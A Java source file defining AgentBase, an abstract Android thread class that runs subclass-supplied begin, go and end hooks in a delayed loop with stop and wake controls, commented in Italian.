package com.ht.RCSAndroidGUI;

import java.nio.ByteBuffer;

import android.util.Log;

public abstract class AgentBase extends Thread implements Runnable {
    private long delay = Long.MAX_VALUE;
    private int status = Agent.AGENT_STOPPED;
    private boolean stopped;
    private boolean caffe;
    
    protected ByteBuffer myConf;
    
    public synchronized void run() {
    	status = Agent.AGENT_RUNNING;
    	
    	begin();
        
        while (!stopped) {
            if (caffe) {
                // fai il caffe'....
            }
            
            go();

            try {
                wait(delay);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            
            Log.d("Que", "BaseAgent Running");
        }

        end();
        
        status = Agent.AGENT_STOPPED;
        Log.d("Que", "BaseAgent stopped");
    }

    // gli eredi devono implementare i seguenti tre metodi astratti
    public abstract void begin();
    public abstract void go();
    public abstract void end();
    public abstract void parse(byte[] conf);

    // riesegue l'actualRun
    public synchronized void next() {
        if (!stopped) {
            notify();
        }
    }

    // ferma il thread
    public synchronized void stopAgent() {
        if (!stopped) {
            stopped = true;
            notify();
        }
    }

    //definisce il delay al prossimo giro
    public void setDelay(int delay) {
        this.delay = delay;
        next();
    }

    public synchronized int getStatus() {
    	return status;
    }
    
    // fai il caffe'.
    public void faiCaffe(){
        caffe = true;
        notify();
    }
}